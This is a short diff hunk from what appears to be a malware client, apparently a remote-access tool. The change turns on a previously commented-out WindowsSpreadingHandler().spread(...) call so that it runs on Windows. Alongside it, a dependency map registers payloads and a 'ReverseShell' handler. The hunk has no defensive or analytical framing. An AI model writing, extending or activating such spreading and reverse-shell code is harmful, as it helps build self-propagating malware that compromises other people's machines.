@@ -7,7 +7,7 @@ from client import settings
 from utils import logger
 
 try:
-	# WindowsSpreadingHandler().spread(os.path.basename(sys.argv[0]))
+	if settings.PLATFORM=="windows":WindowsSpreadingHandler().spread(os.path.basename(sys.argv[0]))
 	deps={
         "payload_register":valid_payload_registry(),
         "ReverseShell":ShellPayloadHandler
